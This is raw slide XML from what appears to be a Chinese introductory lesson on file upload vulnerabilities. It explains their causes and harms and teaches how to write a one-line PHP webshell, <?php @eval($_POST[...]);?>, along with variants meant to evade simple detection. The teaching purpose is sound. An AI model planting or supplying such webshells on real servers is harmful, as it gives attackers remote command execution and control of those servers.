                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>主要原因</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793115" y="2292985"/>
            <a:ext cx="10379710" cy="3538220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
              <a:t>文件类型验证不严格</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>服务器只通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件扩展名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>（如 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>.jpg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>.png</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>）来判断文件类型，而没有检查文件的真实内容。攻击者可以通过修改后缀或使用双扩展名（如 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>shell.php.jpg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>）绕过检测。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
              <a:t>只进行前端验证</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>一些系统只在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>前端</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>或 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>）限制文件类型，但前端代码可以被轻易绕过。如果服务器端没有再次验证，攻击者就可以上传任意文件。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
              <a:t>依赖不可靠的文件信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>例如只根据 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>请求中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Content-Type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>判断文件格式，而该信息是客户端可伪造的，因此不能作为安全依据。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
              <a:t>未检查文件内容</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>服务器没有对文件的真实</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>内容</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>或文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>特征</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>进行检测，攻击者可以在图片文件中嵌入恶意脚本，从而绕过简单的类型检查。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
              <a:t>文件存储和权限配置不安全</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>上传文件被直接存储在 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>可访问目录中，并且服务器允许在该目录执行脚本，一旦上传恶意文件就可能被直接访问和执行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>入门</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="1503045"/>
            <a:ext cx="2935605"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>文件上传漏洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>危害</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016000" y="2150110"/>
            <a:ext cx="9671685" cy="3969385"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>恶意代码执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者上传带有恶意代码的文件（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> .php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>.jsp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>等动态脚本文件），服务器可能会直接执行这些文件中的恶意代码，导致远程代码执行（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>RCE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>2. Webshell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者通过上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> Webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>后门）文件，获得对服务器的控制权。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Webshell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>允许攻击者在服务器上执行命令，查看、修改文件，甚至获取系统权限。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>信息泄露</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>在某些情况下，攻击者可能上传恶意文件（如图像文件），然后通过这些文件来推断服务器的配置，或利用其他漏洞提取敏感信息。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>拒绝服务（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者上传大文件，消耗服务器的存储资源，导致服务器资源耗尽，影响正常服务。</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文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>入门</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="1503045"/>
            <a:ext cx="2488565"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>一句话</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>木马编写</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="843280" y="2086610"/>
            <a:ext cx="10372725" cy="4246245"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>核心代码：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>&lt;?php @eval($_POST['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>密码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>']);?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>代码拆解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     &lt;?php ?&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>脚本的开始与结束标记；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     @</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：抑制脚本执行错误提示（避免因报错暴露木马）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     eval()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>核心执行函数，可将传入的字符串作为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代码执行；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>      $_POST['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>密码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>']</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>方式接收参数（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>密码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>为自定义连接密钥，如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>123/a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>），避免</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> GET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>方式的参数泄露。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>变体格式（绕过简单检测）：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>替换接收方式：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>&lt;?php @eval($_REQUEST['a']);?&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>$_REQUEST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可接收</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> GET/POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>参数，兼容性更强）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>     &lt;script&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>标记</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>&lt;script language=''php"&gt;eval($_POST["cmd"])&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（告诉前端的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>把这一段代码当作</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>去执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>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文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>入门</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="1503045"/>
            <a:ext cx="4649470"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en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
